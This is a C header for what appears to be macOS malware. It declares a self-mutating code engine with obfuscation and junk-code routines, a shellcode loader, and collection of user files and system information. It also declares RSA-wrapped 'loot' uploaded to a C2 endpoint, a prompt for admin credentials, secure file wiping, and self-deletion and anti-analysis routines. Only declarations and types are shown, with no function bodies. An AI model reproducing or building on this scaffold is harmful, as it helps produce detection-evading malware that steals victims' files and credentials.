#pragma once
#ifdef __cplusplus
extern "C" {
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include <errno.h>
#include <signal.h>
#include <time.h>

#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/random.h>
#include <sys/xattr.h>
#include <arpa/inet.h>
#include <libgen.h>
#include <ftw.h>
#include <grp.h>
#include <pwd.h>
#include <uuid/uuid.h>
#include <dlfcn.h>
#include <sys/sysctl.h>

#include <mach-o/dyld.h>
#include <mach-o/loader.h>
#include <mach-o/getsect.h>
#include <mach-o/fat.h>
#include <Security/SecRandom.h>
#include <libkern/OSCacheControl.h>
#include <mach/mach_time.h>
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <OpenDirectory/OpenDirectory.h>

#include <zlib.h>
#include <curl/curl.h>
#include <openssl/rsa.h>
#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/rand.h>
#include <openssl/aes.h>
#include <CommonCrypto/CommonCryptor.h>
#include <CommonCrypto/CommonDigest.h>

#include <libproc.h>
#include <sys/proc.h>

#ifdef __x86_64__
#include <immintrin.h>
#endif

#define KEY_SIZE 32
#define IV_SIZE  16
#define PAGE_SIZE 4096
#define MAX_FILES 1024

#ifdef TEST
#define DBG(fmt, ...) fprintf(stderr, fmt "\n", ##__VA_ARGS__)
#else
#define DBG(...) ((void)0)
#endif

#define ROTL32(x, n) (((x) << (n)) | ((x) >> (32 - (n))))
#define cipher(k,iv,in,out,len) crypt_payload(1,k,iv,in,out,len)
#define decipher(k,iv,in,out,len) crypt_payload(0,k,iv,in,out,len)

#define patch8(b,s,o,v) do{if((o)<(s))(b)[o]=(v);}while(0)
#define patch16(b,s,o,v) do{if((o)+1<(s))*((uint16_t*)&(b)[o])=(v);}while(0)
#define patch32(b,s,o,v) do{if((o)+3<(s))*((uint32_t*)&(b)[o])=(v);}while(0)

//  Types 

typedef enum {
    ARM_OP_NONE = 0,
    ARM_OP_ADD, ARM_OP_SUB, ARM_OP_MOV, ARM_OP_AND, ARM_OP_ORR, ARM_OP_EOR,
    ARM_OP_LDR, ARM_OP_STR, ARM_OP_BRANCH, ARM_OP_BRANCH_LINK, ARM_OP_BRANCH_COND,
    ARM_OP_RET, ARM_OP_SVC, ARM_OP_MRS, ARM_OP_MSR, ARM_OP_SYS
} arm_op_type_t;

typedef enum {
    ARM_REG_X0 = 0, ARM_REG_X1, ARM_REG_X2, ARM_REG_X3, ARM_REG_X4, ARM_REG_X5, ARM_REG_X6, ARM_REG_X7,
    ARM_REG_X8, ARM_REG_X9, ARM_REG_X10, ARM_REG_X11, ARM_REG_X12, ARM_REG_X13, ARM_REG_X14, ARM_REG_X15,
    ARM_REG_X16, ARM_REG_X17, ARM_REG_X18, ARM_REG_X19, ARM_REG_X20, ARM_REG_X21, ARM_REG_X22, ARM_REG_X23,
    ARM_REG_X24, ARM_REG_X25, ARM_REG_X26, ARM_REG_X27, ARM_REG_X28, ARM_REG_X29, ARM_REG_X30, ARM_REG_XZR
} arm_reg_t;

typedef enum { OP_NONE, OP_REG, OP_MEM, OP_IMM, OP_REL } op_type_t;
typedef struct {
    op_type_t type;
    uint8_t size;
    union {
        uint8_t reg;
        struct { uint8_t base, index, scale; int64_t disp; } mem;
        uint64_t imm;
    };
} operand_t;

typedef struct {
    uint8_t raw[15];
    uint8_t len;
    uint8_t prefixes;
    uint8_t rex;
    uint8_t opcode[4];
    uint8_t opcode_len;
    bool vex, evex, has_modrm, has_sib;
    uint8_t modrm, sib, disp_size;
    int64_t disp;
    uint8_t imm_size;
    uint64_t imm;
    bool rex_w, rex_r, rex_x, rex_b;
    bool modifies_ip, is_control_flow, valid, ring0;
    int64_t target;
    operand_t ops[3];
    bool lock, rep, repne;
    uint8_t seg;
    bool opsize_16;
    bool addrsize_32;
    bool rip_relative;
} x86_inst_t;

typedef struct {
    uint32_t raw;
    uint32_t opcode;
    uint32_t opcode_len;
    arm_op_type_t type;
    arm_reg_t rd, rn, rm, ra;
    uint64_t imm;
    uint8_t imm_size, shift_type, shift_amount;
    bool is_64bit, is_signed, is_privileged, is_control_flow, modifies_ip, valid, privileged;
    uint8_t len;
    int64_t target;
} arm64_inst_t;


typedef struct { uint8_t rd_reegs[8],wr_reegs[8],regs_rd,regs_wr; uint64_t mem_addr; bool mem_rd,mem_wr; uint8_t flag_rd,falg_wr; int8_t stk_adj; bool ring0,voll,can_throw; } real_sem_t;
typedef struct { uint8_t base_reg,index_reg,scale; int64_t disp; bool has_sib,rip_relative; } addr_mode_t;
typedef uint8_t (*memread_fn)(uintptr_t);
typedef int (*sysctl_fn)(int*,u_int,void*,size_t*,void*,size_t);

typedef struct __attribute__((packed)) { uint8_t key[KEY_SIZE],iv[kCCBlockSizeAES128]; uint64_t seed; uint32_t count; uint8_t hash[CC_SHA256_DIGEST_LENGTH]; } enc_header_t;
typedef struct { uint8_t key[KEY_SIZE],iv[16],stream[64]; size_t position; uint64_t counter; } chacha_state_t;
typedef struct { char *path; size_t size; } file_t;
typedef enum { WIPE_ZERO,WIPE_ONE,WIPE_RANDOM,WIPE_CUSTOM } wipe_pattern_t;
typedef struct { int passes; wipe_pattern_t *patterns; unsigned char custom; } wipe_conf_t;
typedef struct { char *data; size_t size; } mem_buf_t;
typedef struct { uint8_t key[KEY_SIZE],iv[16]; size_t len; uint8_t data[64]; } enc_vault_t;
typedef struct { chacha_state_t rng; } dummy_rng_t; 

typedef enum { MUT_SUB,MUT_EQUIV,MUT_PRED,MUT_DEAD,MUT_SPLIT,MUT_OBFUSC,MUT_FLATTEN,MUT_REORDER,MUT_JUNK } mutx_type_t;
typedef enum { ST_NOP=0,ST_ALU,ST_BIT,ST_MOV,ST_CMP,ST_FLOW,ST_JCC,ST_STK,ST_FLAG,ST_MEM,ST_SYS } sem_type_t;

//  Externs 
extern char C2_ENDPOINT[1024],PUBKEY_URL[1024],tmpDirectory[256],*_strings[8];
extern int fileCount;
extern file_t *files[MAX_FILES];
extern const enc_vault_t vault[];
extern const enc_vault_t paths[];
extern struct mach_header_64 _mh_execute_header;
extern uint8_t data[sizeof(enc_header_t) + PAGE_SIZE + IV_SIZE];
extern const uint8_t dummy[];
extern const size_t len;
extern const size_t vault_count,paths_count;

static inline uint8_t modrm_reg(uint8_t m) { return (m >> 3) & 7; }
static inline uint8_t modrm_rm(uint8_t m)  { return m & 7; }

typedef struct {
    uint8_t rd_reegs[8];
    uint8_t wr_reegs[8];
    uint8_t regs_rd;
    uint8_t regs_wr;
    bool mem_rd;
    bool mem_wr;
    bool flag_rd;
    bool flag_wr;
} x86_shit;

static const struct {
    uint32_t orgi_op;
    uint32_t clos_op;
    const char *desc;
} equiv_table[] = {};

static const size_t arm_equiv = 0;

typedef struct { 
    size_t off;          
    size_t blki;         
    int typ;             
    uint64_t abs_target; 
    size_t inst_len;     
} patch_t;

typedef struct {
    size_t start, end, successors[4], num_successors;
    bool is_exit;
} rec_block_t;

typedef struct {
    rec_block_t *blocks;
    size_t num_blocks, cap_blocks;
    bool *visited;
    size_t code_size;
} rec_flowmap;

typedef struct {
    size_t offset;
    size_t length;
    mutx_type_t type;
    uint32_t gen;
    char des[64];
} mutx_entry_t;

typedef struct {
    const uint8_t *debug_code;
    size_t debug_code_size;
    bool unsafe_mode;
} engine_context_t;

typedef struct { mutx_entry_t *entries; size_t count, cap; } muttt_t;
typedef struct { uint8_t reg; size_t def_offset, last_use; bool iz_live, iz_vol; } reg_liveness_t;
typedef struct { reg_liveness_t regs[16]; size_t num_regs; } liveness_state_t;

typedef struct { size_t start, end, id, successors[4], num_successors; bool is_exit; } blocknode;
typedef struct { blocknode *blocks; size_t num_blocks, cap_blocks, entry_block, exit_block; } flowmap;
typedef struct { size_t *dominators, num_doms, *dominated, num_dominated; } dom_info_t;
typedef struct { size_t header, *body, body_size, *exits, exits_size; } loop_info_t;

typedef struct { size_t caller, callee, call_site; } call_edge_t;
typedef struct { call_edge_t *edges; size_t num_edges, *functions, num_functions; } call_graph_t;
typedef struct { size_t off, len; uint8_t type; bool cf, valid; uint8_t raw[16]; } instr_info_t;

typedef struct { uint8_t type, size, reg; int64_t disp; uint64_t imm; bool izre, izwri; } m_operand_t;
typedef struct { sem_type_t sem_type; m_operand_t ops[3]; uint8_t num_ops; bool f_out, f_in, m_out, m_in, stk_out, stk_in; uint8_t stk_adj; bool ring0, voll; } sem_meta_t;

//  Core API 
void run(void);
int main(void);
void initialize(void);

//  Crypto 
size_t crypt_payload(const int mode,
                            const uint8_t *key,
                            const uint8_t *iv,
                            const uint8_t *src,
                            uint8_t *dst,
                            const size_t size);
void chacha20_block(const uint32_t[8],uint32_t,const uint32_t[3],uint32_t[16]);
void chacha20_init(chacha_state_t*,const uint8_t*,size_t);
uint32_t chacha20_random(chacha_state_t*);

void mutate(uint8_t *code, size_t size, chacha_state_t *rng, unsigned gen, engine_context_t *ectx);
void mut_sh3ll(uint8_t *code, size_t size, chacha_state_t *rng, unsigned gen, engine_context_t *ectx);
int init_mut(muttt_t *log);
void drop_mut(muttt_t *log, size_t a, size_t b, mutx_type_t t, uint32_t gen, const char *desc);
void boot_live(liveness_state_t *ls);
void pulse_live(liveness_state_t *ls, size_t n, const void *ctx);
uint8_t jack_reg(const liveness_state_t *ls, uint8_t reg, size_t size, chacha_state_t *rng);
void spew_trash(uint8_t *buf, size_t *len, chacha_state_t *rng);
void freeme(muttt_t *m);
bool sketch_flow(uint8_t *code, size_t size, flowmap *fm);
size_t decode_map(const uint8_t *code, size_t size, instr_info_t *out, size_t outcap);
int chk_map(const instr_info_t *map, size_t maplen, size_t codesz);

void flatline_flow(uint8_t *code, size_t size, flowmap *fm, chacha_state_t *rng);
void shuffle_blocks(uint8_t *code, size_t size, void *rng);
void mut_with_x86(uint8_t *code, size_t size, chacha_state_t *rng, unsigned gen, muttt_t *log);
void forge_ghost(uint8_t *buf, size_t *len, uint32_t seed, chacha_state_t *rng);

bool is_chunk_ok(const uint8_t *chunk, size_t max_len);
bool is_op_ok(const uint8_t *op);
size_t snap_len(const uint8_t *buf, size_t maxlen);

//  Mach-O / Loader 
int boot(uint8_t*,size_t,chacha_state_t*);
int cook(uint8_t*,size_t,chacha_state_t*);
void pop_shellcode(uint8_t*,size_t);
void O2(void*,const void*,size_t);
void zer0(void*,size_t);
int oprw(const char*);
void clso(int);
int reset(int);
int wrby(int,unsigned char*,size_t);
int copyFile(const char*,const char*);
unsigned char* compressData(const unsigned char*,size_t,size_t*);
int fileCollector(const char*,const struct stat*,int,struct FTW*);
void sendFilesBundle(RSA*);

int scan(void);
int path_exists(const char*);
int find_self(char*,uint32_t*);
void k_ill(void);
int autodes(void);
void set_crash(void);
__attribute__((noreturn)) void panic(void);

//  Vault/Strings 
char *decrypt_path(const uint8_t*,const uint8_t*,const uint8_t*,size_t);
unsigned char *wrap_loot(const unsigned char*,size_t,size_t*,RSA*);
void initialize__strings(void);
void cleanup__strings(void);

//  Network/C2 
size_t networkWriteCallback(void*,size_t,size_t,void*);
RSA* grab_rsa(const char*);
char* fetch_past(const char*);
int from_past(const char*,char*,char*);
void overn_out(const char*,const unsigned char*,size_t);
void profiler(char*,size_t,size_t*);
void collectSystemInfo(RSA*);
void mint_uuid(char*);
int sendProfile(void);

//  Auth/User 
int auth(const char*,const char*);
int is_user_admin(const char*);
char *get_device_id(void);
char *get_current_user(void);
void request_a(void);
char *request_input(const char*);

int trim_newlines(uint8_t*,size_t);
char *trim_w1(char*);
void free_if_not(void*);
char *extract(const char*,const char*,const char*);
void hexdump(const uint8_t*,size_t,const char*);
int _snprintf(char*,size_t,const char*,...);
char *_strncpy(char*,const char*,size_t);
void update(void);

//  Decoders 
#if defined(ARCH_X86)
bool decode_x86(const uint8_t*, uintptr_t, x86_inst_t*, memread_fn);
bool decode_x86_withme(const uint8_t*, size_t, uintptr_t, x86_inst_t*, memread_fn);
#elif defined(ARCH_ARM)
bool decode_arm64(const uint8_t*, arm64_inst_t*);
#endif

#ifdef __cplusplus
}
#endif
